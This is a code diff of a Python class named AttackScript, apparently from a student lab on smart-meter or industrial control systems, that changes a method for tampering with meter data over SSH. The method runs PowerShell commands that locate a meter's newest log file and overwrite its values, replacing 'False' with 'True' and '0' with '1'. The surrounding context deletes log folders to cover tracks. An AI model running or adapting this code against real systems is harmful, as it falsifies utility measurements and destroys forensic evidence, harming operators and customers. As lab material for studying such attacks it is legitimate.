@@ -1764,20 +1764,25 @@ class AttackScript:
         for log_file in log_files_to_delete:
             self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
 
-    def ChangeDataValueSendBack(self):
+    def ChangeDataValueSendBack(self, meter_id: str):
+        """
+            Change the data value of the latest meter log file, in the specified meter ID's folder
+            Example file path of the meter ID is: C:\Users\Student\Documents\SmartMeterData\Meter2
 
-        #Get File Path
-        command_output , stderr= self.ssh_run_command("pwsh.exe -Command \"(Get-ChildItem -Path \"C:\\Users\\Student\\Documents\\SmartMeterData\\Meter2\" | Sort-Object -Property LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName)")
+            Args:
+                meter_id (str): The meter ID to change the data value of
+        """
+
+        # Get File Path
+        command_output = self.ssh_run_command(f"pwsh.exe -Command \"(Get-ChildItem -Path \"C:\\Users\\Student\\Documents\\SmartMeterData\\Meter{meter_id}\" | Sort-Object -Property LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName)")
         print([command_output[:-1]])
-        #print(stderr)
 
         # Command to replace 'False' with 'True' in the file
-        command_replace_false , stderr= self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace 'False', 'True' | Set-Content -Path \"{command_output[:-1]}\"")
+        command_replace_false = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace 'False', 'True' | Set-Content -Path \"{command_output[:-1]}\"")
         print("Replaced False with with True")
-        #print(stderr)
 
         # Replace '0' with '1' in the file
-        command_replace_zero , stderr= self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace '0', '1' | Set-Content -Path \"{command_output[:-1]}\"")
+        command_replace_zero = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace '0', '1' | Set-Content -Path \"{command_output[:-1]}\"")
         print("Replaced 0 with 1")
 
     ########
